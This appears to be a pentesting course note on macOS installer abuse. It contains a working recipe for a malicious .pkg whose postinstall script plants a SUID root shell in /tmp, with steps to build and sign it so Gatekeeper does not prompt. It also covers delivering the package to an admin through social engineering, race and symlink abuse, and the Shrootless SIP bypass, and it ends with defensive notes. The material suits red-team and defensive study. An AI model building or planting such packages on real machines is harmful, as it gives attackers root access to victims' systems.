---
tags: [macos, privesc, installers, pkg, pentesting, red-team]
difficulty: intermediate
module: "45 - macOS Privilege Escalation"
topic: "45.16 macOS Installers and Package Abuse"
---

# macOS Installers and Package Abuse

## Introduction
macOS software is distributed as **`.pkg`** installer packages, **`.dmg`** disk images, and app bundles. Installers are a uniquely powerful local-privesc surface because **`.pkg` packages can run scripts as root** (pre/post-install scripts) and the installation machinery (`installer`, `system_installer`, `package_kit`) runs with high privilege. Historically, abuse of these privileged installer daemons has even yielded **SIP bypasses** (see [[03 - System Integrity Protection SIP]]). This note covers building malicious packages, abusing the install flow, and the privilege-inheritance bugs that make installers dangerous.

## Anatomy of a .pkg
A flat package is an `xar` archive containing a payload, a **Bom/PackageInfo**, and optional **scripts** (`preinstall`, `postinstall`):
```bash
# Inspect a pkg
pkgutil --expand-full target.pkg /tmp/pkg_out
ls /tmp/pkg_out/Scripts        # preinstall / postinstall run with elevated rights
cat /tmp/pkg_out/PackageInfo   # install-location, auth level, scripts
xar -xf target.pkg -C /tmp/x   # raw extraction
```

## Building a Malicious Package
A `.pkg` with a `postinstall` script executes that script as **root** when installed by an admin (or via a privileged install flow):
```bash
mkdir -p build/scripts
cat > build/scripts/postinstall <<'EOF'
#!/bin/bash
id > /tmp/pkg_root_proof
cp /bin/zsh /tmp/rootshell && chown root /tmp/rootshell && chmod 4755 /tmp/rootshell
exit 0
EOF
chmod +x build/scripts/postinstall
pkgbuild --nopayload --scripts build/scripts \
  --identifier com.example.evil --version 1.0 evil.pkg
# (optionally sign with a Developer ID to avoid Gatekeeper prompts)
productsign --sign "Developer ID Installer: ..." evil.pkg evil-signed.pkg
```
Delivery angles: social-engineer an admin to run it (it looks like a normal installer), or — more interesting for privesc — **abuse an existing privileged install pathway** that accepts attacker-supplied packages without proper validation.

## Abuse Patterns of the Install Flow
```text
+---------------------------------------------------------------+
|             WHY INSTALLERS ESCALATE PRIVILEGE                 |
+---------------------------------------------------------------+
|  installer / system_installer / package_kit run privileged    |
|        |                                                       |
|  They execute pre/postinstall SCRIPTS from the .pkg as root   |
|        |                                                       |
|  Bugs:                                                        |
|   - script paths / working dirs are writable mid-install      |
|     (TOCTOU: swap a file the privileged script will run)      |
|   - installed files land in writable temp then get moved      |
|     with root -> redirect via symlink                         |
|   - entitled installer daemon doesn't drop SIP-bypass         |
|     capability before running the script -> SIP bypass        |
+---------------------------------------------------------------+
```

### 1. Script/working-directory races (TOCTOU)
Privileged installers stage files in predictable, sometimes world-writable temp directories. If a root-run script executes a binary or sources a file from a writable staging path, an attacker can swap it between check and use.

### 2. Symlink redirection of privileged writes
The installer writes payload files as root to a computed path; planting a symlink can redirect that write to a protected location (overwrite a system binary / launch daemon) — classic privesc and, against SIP-bypass-entitled installers, a SIP bypass.

### 3. Inherited SIP-bypass capability (Shrootless-class)
`system_installer` and friends historically held `com.apple.rootless.install` and spawned post-install scripts **without dropping it**, so the attacker's script inherited the ability to write SIP-protected paths — the root cause of CVE-2021-30892 (Shrootless) and relatives. Apple's fix sandboxes child scripts.

### 4. Auto-updaters as a softer target
Many third-party apps ship **auto-updaters** that download and install packages or run helper tools as root (overlaps with [[11 - XPC and Mach IPC Abuse]]). Weak update verification (no signature/TLS pinning, writable update staging) lets an attacker substitute a malicious update that installs as root.

## DMG / App-Bundle Considerations
`.dmg` mounting has its own historical bugs (auto-run, quarantine non-propagation — see [[05 - Gatekeeper and Quarantine Bypass]]). Mounting a crafted filesystem image has also been a path to kernel/filesystem bugs.

## Why It Matters
- A `.pkg` postinstall is the simplest "admin runs my installer → I am root" primitive in social-engineering scenarios.
- Flaws in privileged installer daemons/auto-updaters are a top **local root** and even **SIP-bypass** source on real engagements.

## Defensive Notes
- Only install signed/notarized packages; review `pkgutil --expand-full` scripts before deploying software fleet-wide.
- Developers: sandbox/validate post-install scripts, drop privileged entitlements before spawning children, write to non-writable staging, resolve symlinks, and verify update integrity (signature + pinning).
- Monitor `installer`/`system_installer` spawning shells and new SUID binaries appearing after installs.

## Related Notes
- [[03 - System Integrity Protection SIP]]
- [[11 - XPC and Mach IPC Abuse]]
- [[05 - Gatekeeper and Quarantine Bypass]]
- [[13 - macOS Auto-Start Locations and Persistence]]
- [[08 - AlwaysInstallElevated]]
